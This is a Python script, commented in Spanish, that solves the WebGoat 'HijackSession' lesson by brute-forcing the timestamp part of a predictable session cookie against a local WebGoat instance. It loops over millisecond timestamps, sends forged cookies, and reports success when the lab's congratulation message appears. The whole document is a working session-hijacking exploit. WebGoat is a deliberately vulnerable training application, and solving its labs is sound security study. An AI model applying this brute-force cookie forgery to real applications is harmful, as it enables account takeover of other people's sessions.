import requests

# URL del endpoint de WebGoat
url = "http://localhost:8080/WebGoat/HijackSession/login"

# Parte identificativa que parece corresponder a un usuario autenticado
cookie_id = "6650566209097086432"

# Reemplaza con tu JSESSIONID activo (puedes obtenerlo con Burp o DevTools)
session_id = "C3E6AEF9115B9F0DC9EAF6A8507E2873"

# Rango de timestamps a probar (en milisegundos)
timestamp_inicio = 1745167977551
timestamp_fin = 1745167985810

# Cabeceras necesarias para simular correctamente el navegador
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://localhost:8080",
    "Referer": "http://localhost:8080/WebGoat/start.mvc"
}

# Bucle de fuerza bruta sobre el timestamp
for ts in range(timestamp_inicio, timestamp_fin + 1):
    hijack_cookie = f"{cookie_id}-{ts}"
    cookies = {
        "JSESSIONID": session_id,
        "hijack_cookie": hijack_cookie
    }

    # Enviar solicitud POST
    response = requests.post(url, headers=headers, cookies=cookies)

    # Verificar si contiene la respuesta de éxito
    if "feedback\":\"Congratulations" in response.text:
        print(f"\n✅ ¡ÉXITO! Sesión secuestrada correctamente")
        print(f"🟢 hijack_cookie válido: {hijack_cookie}")
        print(f"\n📨 Respuesta completa:\n{response.text}")
        break
    else:
        print(f"[❌] Intentado: {hijack_cookie}")

